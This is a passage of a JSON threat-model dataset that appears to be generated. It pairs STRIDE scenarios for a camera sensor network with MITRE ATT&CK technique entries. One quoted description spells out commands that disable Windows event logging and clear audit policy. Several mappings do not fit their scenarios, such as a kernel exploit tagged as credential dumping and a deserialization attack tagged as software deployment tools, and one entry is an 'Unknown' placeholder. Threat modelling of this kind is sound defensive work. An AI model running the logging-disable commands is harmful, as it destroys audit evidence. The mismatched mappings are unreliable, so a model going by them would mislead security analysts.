            "MITRE ATT&CK Keywords": [
                "data manipulation",
                "tampering",
                "local access",
                "storage"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious firmware updates to camera nodes causing altered functionality or shutdown.",
            "Assumptions": [
                {
                    "Assumption": "Firmware update process lacks authentication",
                    "Role": "Attacker",
                    "Condition": "Attacker can distribute unauthorized firmware"
                },
                {
                    "Assumption": "Insecure update channels",
                    "Role": "System Architect",
                    "Condition": "Update process doesn't verify authenticity of firmware"
                },
                {
                    "Assumption": "Firmware is not integrity-checked",
                    "Role": "System Architect",
                    "Condition": "System fails to check firmware checksums or signatures"
                }
            ],
            "Potential Impact": "Functional degradation or complete failure of the sensor network.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware attack",
                "code injection",
                "device"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Modification or deletion of configuration files on the server managing the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Server configuration files are accessible and writable",
                    "Role": "Attacker",
                    "Condition": "Attacker gains access to server configuration directories"
                },
                {
                    "Assumption": "Insufficient access controls on configuration files",
                    "Role": "System Administrator",
                    "Condition": "Files are not properly permissioned"
                },
                {
                    "Assumption": "Logging and alerting for configuration changes are insufficient",
                    "Role": "System Architect",
                    "Condition": "No real-time alerts on config changes"
                }
            ],
            "Potential Impact": "Service disruption and potential misconfiguration leading to security vulnerabilities.",
            "MITRE ATT&CK Keywords": [
                "configuration tampering",
                "system compromise",
                "server",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates log files on the central server to cover tracks of malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored without integrity checks",
                    "Role": "System Administrator",
                    "Condition": "Logs are not hashed or signed"
                },
                {
                    "Assumption": "Attacker has privileged access to log storage",
                    "Role": "Attacker",
                    "Condition": "Attacker escalates privileges or exploits vulnerabilities"
                },
                {
                    "Assumption": "No secure log archival process",
                    "Role": "System Architect",
                    "Condition": "Logs are not backed up or monitored"
                }
            ],
            "Potential Impact": "Loss of accountability and difficulty in incident investigation.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "repudiation",
                "data integrity",
                "system"
            ],
            "mitre_technique": {
                "name": "Indicator Removal from Tools",
                "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
                "id": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
                "technique_id": "T1066"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Malicious user denies conducting specific activities due to absence of strong non-repudiation controls.",
            "Assumptions": [
                {
                    "Assumption": "Lack of audit trails for user actions",
                    "Role": "System Architect",
                    "Condition": "System doesn't log detailed user actions"
                },
                {
                    "Assumption": "Weak or missing digital signatures for critical actions",
                    "Role": "Developer",
                    "Condition": "Actions are not digitally signed"
                },
                {
                    "Assumption": "No user authentication logs",
                    "Role": "System Administrator",
                    "Condition": "User sessions and actions are not logged properly"
                }
            ],
            "Potential Impact": "Difficulty in enforcing accountability and tracking malicious activities.",
            "MITRE ATT&CK Keywords": [
                "non-repudiation",
                "identity misrepresentation",
                "tracking",
                "logging"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Compromised system denies sending malicious updates or commands to VSN nodes.",
            "Assumptions": [
                {
                    "Assumption": "Communication lacks secure audit mechanisms",
                    "Role": "System Architect",
                    "Condition": "Command channels are not logged or secured"
                },
                {
                    "Assumption": "Lack of command integrity checks",
                    "Role": "Developer",
                    "Condition": "Commands are not verified or logged"
                },
                {
                    "Assumption": "No real-time monitoring of command channels",
                    "Role": "System Administrator",
                    "Condition": "Command activities are not monitored"
                }
            ],
            "Potential Impact": "Prevention of forensic analysis and accountability misdirection.",
            "MITRE ATT&CK Keywords": [
                "command manipulation",
                "audit evasion",
                "repudiation",
                "system integrity"
            ],
            "mitre_technique": {
                "name": "TCC Manipulation",
                "description": "Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to execute malicious applications with elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).\n\nWhen an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.(Citation: welivesecurity TCC)\n\nAdversaries may manipulate the TCC database or otherwise abuse the TCC service to execute malicious content. This can be done in various ways, including using privileged system applications to execute malicious payloads or manipulating the database to grant their application TCC permissions. \n\nFor example, adversaries can use Finder, which has FDA permissions by default, to execute malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002) while preventing a user prompt. For a system without System Integrity Protection (SIP) enabled, adversaries have also manipulated the operating system to load an adversary controlled TCC database using environment variables and [Launchctl](https://attack.mitre.org/techniques/T1569/001).(Citation: TCC macOS bypass)(Citation: TCC Database)\n\nAdversaries may also opt to instead inject code (e.g., [Process Injection](https://attack.mitre.org/techniques/T1055)) into targeted applications with the desired TCC permissions.\n",
                "id": "attack-pattern--e8a0a025-3601-4755-abfb-8d08283329fb",
                "technique_id": "T1548.006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to sensitive visual data transmitted over the network.",
            "Assumptions": [
                {
                    "Assumption": "Data is sent in plaintext over the network",
                    "Role": "System Architect",
                    "Condition": "Communication lacks encryption"
                },
                {
                    "Assumption": "Network is publicly accessible",
                    "Role": "Network Administrator",
                    "Condition": "Network segments are not properly isolated"
                },
                {
                    "Assumption": "Weak network access controls",
                    "Role": "Network Administrator",
                    "Condition": "Insufficient firewalls or access lists"
                }
            ],
            "Potential Impact": "Compromise of sensitive visual data, leading to potential privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "eavesdropping",
                "network",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Leakage of sensitive configuration or operational data from the central server.",
            "Assumptions": [
                {
                    "Assumption": "Configuration data is stored in an unencrypted format",
                    "Role": "System Architect",
                    "Condition": "No encryption applied to sensitive files"
                },
                {
                    "Assumption": "Inadequate access controls to configuration files",
                    "Role": "System Administrator",
                    "Condition": "Files are accessible to unauthorized users"
                },
                {
                    "Assumption": "Weak network security controls",
                    "Role": "Network Administrator",
                    "Condition": "Network lacks monitoring of sensitive file access"
                }
            ],
            "Potential Impact": "Exposure of system configurations and operational information, facilitating further attacks.",
            "MITRE ATT&CK Keywords": [
                "data leakage",
                "configuration exposure",
                "server",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exposure of sensitive camera locations and configurations through poorly secured API endpoints.",
            "Assumptions": [
                {
                    "Assumption": "API lacks proper authentication and authorization",
                    "Role": "Developer",
                    "Condition": "APIs allow access without strong identity verification"
                },
                {
                    "Assumption": "APIs are exposed to the internet",
                    "Role": "System Architect",
                    "Condition": "Endpoints are accessible from public networks"
                },
                {
                    "Assumption": "Insufficient API request logging",
                    "Role": "Developer",
                    "Condition": "API requests are not logged or monitored"
                }
            ],
            "Potential Impact": "Disclosure of sensitive operational details of camera nodes and their locations.",
            "MITRE ATT&CK Keywords": [
                "API exploitation",
                "data exposure",
                "configuration leak",
                "public endpoint"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack against the central server managing the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Server is accessible over the internet",
                    "Role": "Attacker",
                    "Condition": "Attacker can direct traffic towards the server"
                },
                {
                    "Assumption": "Insufficient network and server resource scaling",
                    "Role": "Network Administrator",
                    "Condition": "Resources are limited and not scalable under high loads"
                },
                {
                    "Assumption": "Inadequate DDoS protection mechanisms",
                    "Role": "System Architect",
                    "Condition": "No DDoS mitigation services in place"
                }
            ],
            "Potential Impact": "Service disruption and unavailability of the visual sensor network.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network flooding",
                "service disruption",
                "server"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious firmware update causing hardware malfunction in camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Firmware update process lacks integrity checks",
                    "Role": "Attacker",
                    "Condition": "Attacker can push malicious updates"
                },
                {
                    "Assumption": "Nodes accept updates without verification",
                    "Role": "System Architect",
                    "Condition": "Firmware updates are applied automatically"
                },
                {
                    "Assumption": "Limited physical access control",
                    "Role": "Network Administrator",
                    "Condition": "Attacker can access devices easily"
                }
            ],
            "Potential Impact": "Physical damage or malfunction of camera nodes, leading to network downtime.",
            "MITRE ATT&CK Keywords": [
                "hardware tampering",
                "firmware attack",
                "device disruption",
                "DoS"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of XML External Entity (XXE) vulnerability causing the server to crash.",
            "Assumptions": [
                {
                    "Assumption": "Server processes XML inputs",
                    "Role": "System Architect",
                    "Condition": "System actively parses XML from various sources"
                },
                {
                    "Assumption": "No protections against XXE attacks in place",
                    "Role": "Developer",
                    "Condition": "Input validation and secure parsing are missing"
                },
                {
                    "Assumption": "Attacker can send crafted XML payloads",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to send inputs to the server"
                }
            ],
            "Potential Impact": "Server crash and unavailability of VSN services.",
            "MITRE ATT&CK Keywords": [
                "XXE attack",
                "XML parsing",
                "server crash",
                "DoS"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of out-of-bounds write vulnerability in the Linux kernel to gain root privileges.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerable Linux kernel version is in use",
                    "Role": "System Architect",
                    "Condition": "System runs the unpatched version of the kernel"
                },
                {
                    "Assumption": "User has some level of access to the system",
                    "Role": "Attacker",
                    "Condition": "Attacker gains initial access through other means"
                },
                {
                    "Assumption": "Lack of kernel protections",
                    "Role": "System Administrator",
                    "Condition": "No additional kernel hardening is applied"
                }
            ],
            "Potential Impact": "Full system compromise and control by the attacker.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "kernel exploit",
                "root access",
                "attack"
            ],
            "mitre_technique": {
                "name": "OS Credential Dumping",
                "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.(Citation: Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.\n\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n",
                "id": "attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22",
                "technique_id": "T1003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of deserialization vulnerability in a server component to execute arbitrary code.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerable deserialization logic exists",
                    "Role": "System Architect",
                    "Condition": "Server components use unsafe deserialization"
                },
                {
                    "Assumption": "Attacker can send serialized objects to the server",
                    "Role": "Attacker",
                    "Condition": "Attacker interacts with the system through input forms or API"
                },
                {
                    "Assumption": "No input validation or sanitization",
                    "Role": "Developer",
                    "Condition": "System does not sanitize serialized data"
                }
            ],
            "Potential Impact": "Execution of arbitrary code and potential system control.",
            "MITRE ATT&CK Keywords": [
                "deserialization attack",
                "code execution",
                "server vulnerability",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "Software Deployment Tools",
                "description": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651) on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Azure AD.(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001) to communicate back to adversary owned infrastructure.(Citation: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)\n\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.",
                "id": "attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414",
                "technique_id": "T1072"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Unauthorized user exploiting system configuration errors to perform administrative actions.",
            "Assumptions": [
                {
                    "Assumption": "Misconfigured access controls",
                    "Role": "System Administrator",
                    "Condition": "Access control lists are not properly managed"
                },
                {
                    "Assumption": "System does not enforce the principle of least privilege",
                    "Role": "System Architect",
                    "Condition": "Users have more privileges than necessary"
                },
                {
                    "Assumption": "Insufficient auditing and monitoring of privileged actions",
                    "Role": "System Architect",
                    "Condition": "System lacks real-time activity monitoring"
                }
            ],
            "Potential Impact": "Unauthorized administrative access and potential for significant system changes or data breaches.",
            "MITRE ATT&CK Keywords": [
                "access control bypass",
                "misconfiguration",
                "privileged actions",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "4",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could use a compromised device to spoof a legitimate camera node and inject falsified visual data into the network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a compromised or counterfeit camera node device.",
                    "Role": "Attacker",
                    "Condition": "Device security is compromised or the device is counterfeit."
                },
                {
                    "Assumption": "The network does not have strong mutual authentication mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Mutual authentication is not implemented or is weak."
                },
                {
                    "Assumption": "The visual data from nodes is used without strict validation.",
                    "Role": "Application User",
                    "Condition": "Data validation mechanisms are insufficient or non-existent."
                }
            ],
            "Potential Impact": "Unauthorized disclosure, data tampering, disruption of service.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Device",
                "Network",
                "Falsified Data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
